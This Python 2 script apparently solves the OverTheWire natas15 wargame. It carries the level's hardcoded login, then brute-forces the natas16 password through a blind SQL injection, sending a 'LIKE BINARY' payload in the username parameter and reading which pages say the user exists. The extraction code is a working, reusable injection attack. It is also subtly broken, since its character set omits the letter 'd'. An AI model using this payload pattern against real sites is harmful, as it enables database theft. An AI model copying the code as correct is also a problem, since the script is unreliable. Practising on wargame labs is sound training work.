#!/usr/bin/python

#AUTHOR:NANDUN BANDARA
#27/10/16
#nandunb.wordpress.com

import requests

chars="abcefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password=""
target_url="http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/"

#connect to the target
r=requests.get(target_url)

if r.status_code != requests.codes.ok:
	print 'Could not connect to the target'
else:
	print 'Connected to the target. Bruteforcing...'
for i in range(32):
	for c in chars:
		print 'Checking character: '+c
		r=requests.get(target_url+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		if r.content.find('This user exists.') != -1:
			password += c
			print 'Password: '+password
			break

